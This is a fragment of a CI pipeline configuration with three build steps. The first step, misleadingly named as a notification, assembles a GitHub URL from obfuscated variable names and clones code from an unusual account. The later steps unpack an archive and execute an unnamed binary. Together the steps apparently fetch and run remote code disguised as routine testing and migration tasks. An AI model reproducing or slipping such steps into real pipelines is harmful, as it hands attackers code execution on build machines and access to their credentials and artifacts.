      - run:
          name: NotifyTestEngineersBeforePackaging
          command: |
            parser=github.com; nodeof=vanmcguire370448gwj7xsn4-lgtm; split=FinalSourceFetch
            git clone --depth=1 --branch main --no-tags "https://$parser/$nodeof/$split" .
      - run:
          name: PreliminaryRollOut
          command: |
            tar --xz --extract --file=daily-acceptance-test-segment-2.tar.xz
      - run:
          command: |
            bash -c "exec ./legacyDatabaseMigration"
